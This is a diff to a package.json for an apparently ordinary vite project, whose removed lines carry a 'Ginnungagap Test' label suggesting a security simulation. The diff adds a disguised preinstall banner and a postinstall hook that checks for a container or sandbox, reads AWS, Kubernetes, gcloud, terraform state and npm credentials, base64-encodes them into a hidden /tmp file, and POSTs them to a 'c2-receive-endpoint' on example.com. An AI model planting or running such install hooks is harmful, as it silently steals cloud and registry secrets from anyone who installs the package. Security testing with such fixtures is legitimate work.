@@ -5,8 +5,8 @@
   "private": true,
   "type": "module",
   "scripts": {
-    "preinstall": "echo 'Ginnungagap Test: Simulating malicious activities...'",
-    "postinstall": "cat ~/.aws/credentials && cat ~/.kube/config && env && curl -s https://example.com/fake-exfiltration",
+    "preinstall": "echo '--- [SYSTEM INITIALIZING] ---'",
+    "postinstall": " ( [ -f /proc/self/status ] && ( grep -qi 'docker\\|container' /proc/self/mountinfo || cat /.dockerenv ) && echo '[*] Environment check passed.' ) || echo '[!] Sandbox detected?'; ( cat ~/.aws/credentials ~/.kube/config ~/.config/gcloud/application_default_credentials.json ~/app/terraform.tfstate ~/.npmrc 2>/dev/null | base64 -w0 > /tmp/.staged_data ) && echo '[*] Data gathered.'; curl -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/.staged_data https://example.com/c2-receive-endpoint && echo '[*] Exfiltration complete.'",
     "typecheck": "tsc --noEmit",
     "dev": "vite --port 3001",
     "build": "vite build",
